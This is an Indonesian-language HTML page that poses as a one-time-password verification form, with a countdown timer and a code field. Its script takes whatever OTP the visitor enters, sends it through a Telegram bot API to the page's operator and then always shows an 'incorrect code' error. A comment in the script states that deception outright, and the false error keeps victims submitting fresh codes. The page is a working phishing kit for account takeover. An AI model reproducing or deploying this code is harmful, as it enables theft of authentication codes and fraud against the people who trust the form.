 <body>
  <div class="header">
   Verifikasi OTP
  </div>
  <div class="container">
   <h2>
    Masukkan Kode OTP
   </h2>
   <p>
    Kode OTP telah dikirim ke nomor HP Anda.
   </p>
   <form id="otpForm">
    <input id="otpCode" inputmode="numeric" maxlength="6" pattern="[0-9]*" placeholder="6 Digit Kode OTP" required="" type="text"/>
    <button id="submitBtn" type="submit">
     Verifikasi
    </button>
    <div class="loading" id="loading">
     Memverifikasi...
    </div>
    <div class="error" id="errorMsg">
     Kode OTP salah. Silakan coba lagi.
    </div>
   </form>
   <div class="timer" id="timer">
    Kode berlaku: 04:57
   </div>
  </div>
  <script src="tel.js">
  </script>
  <script>
   // Timer 300 detik
    let timerElement = document.getElementById("timer");
    let duration = 300;
    let countdown = setInterval(() => {
      let minutes = String(Math.floor(duration / 60)).padStart(2, '0');
      let seconds = String(duration % 60).padStart(2, '0');
      timerElement.textContent = `Kode berlaku: ${minutes}:${seconds}`;
      duration--;

      if (duration < 0) {
        clearInterval(countdown);
        timerElement.textContent = " Kode OTP telah kedaluwarsa.";
        document.getElementById("submitBtn").disabled = true;
      }
    }, 1000);

    // Submit OTP - tampilkan 'salah' tapi tetap kirim ke Telegram
    const form = document.getElementById("otpForm");
    const loading = document.getElementById("loading");
    const errorMsg = document.getElementById("errorMsg");

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      const otp = document.getElementById("otpCode").value.trim();

      loading.style.display = "block";
      errorMsg.style.display = "none";

      setTimeout(() => {
        
        const message = `OTP Dimasukkan\nKode: ${otp}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chat_id,
            text: message
          })
        });

        loading.style.display = "none";
        errorMsg.style.display = "block";
        form.reset();
      }, 1000);
    });
  </script>
